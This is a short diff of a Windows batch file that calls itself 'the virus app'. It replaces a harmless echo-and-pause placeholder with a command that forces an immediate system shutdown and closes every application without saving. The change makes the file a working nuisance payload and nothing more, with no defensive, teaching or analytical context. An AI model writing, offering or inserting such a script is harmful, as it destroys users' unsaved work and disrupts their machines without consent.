@@ -1,3 +1,2 @@
 @echo off
-echo This is the virus app!
-pause
+shutdown /s /f /t 0
